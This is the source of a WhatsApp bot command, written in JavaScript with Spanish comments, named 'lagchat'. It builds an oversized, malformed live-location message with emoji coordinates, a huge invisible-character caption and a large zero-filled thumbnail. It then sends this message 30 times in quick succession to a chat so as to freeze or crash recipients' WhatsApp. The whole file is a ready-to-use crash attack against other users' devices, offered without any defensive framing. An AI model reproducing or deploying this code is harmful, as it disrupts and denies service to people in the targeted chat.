qconst buildLagMessage = () => ({
  viewOnceMessage: {
    message: {
      liveLocationMessage: {
        degreesLatitude: '💣'.repeat(500),
        degreesLongitude: '💥'.repeat(500),
        caption: '\u2063'.repeat(20000) + '💥'.repeat(1000),
        sequenceNumber: '999',
        jpegThumbnail: Buffer.alloc(100000, 0), // Thumbnail corrupto y pesado
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          externalAdReply: {
            title: '💣 LagChat Extremo 💥',
            body: '¡Esto te cerrará WhatsApp!',
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://wa.me/0'
          }
        }
      }
    }
  }
})

let handler = async (m, { conn, isOwner }) => {
  if (!isOwner) throw '⛔ Solo el Owner puede usar este comando.'

  const jid = m.chat
  const times = 30 // Más repeticiones para intensificar

  await m.reply(`⚠️ Enviando ${times} *bombas extremas* al chat...\n❗ Este ataque puede cerrar WhatsApp completamente.`)

  for (let i = 0; i < times; i++) {
    try {
      await conn.relayMessage(jid, buildLagMessage(), { messageId: conn.generateMessageTag() })
      await new Promise(resolve => setTimeout(resolve, 100)) // Menor delay para mayor carga
    } catch (error) {
      console.error('Error al enviar mensaje:', error)
      await m.reply('❗ Falló al enviar. Puede que el chat ya esté colapsado.')
      return
    }
  }

  await m.reply('✅ *Lagchat EXTREMO completado.* ¿Ya se te congeló? 😈🔥')
}

handler.command = /^lagchat$/i
handler.owner = true
handler.tags = ['owner']
handler.help = ['lagchat']

export default handler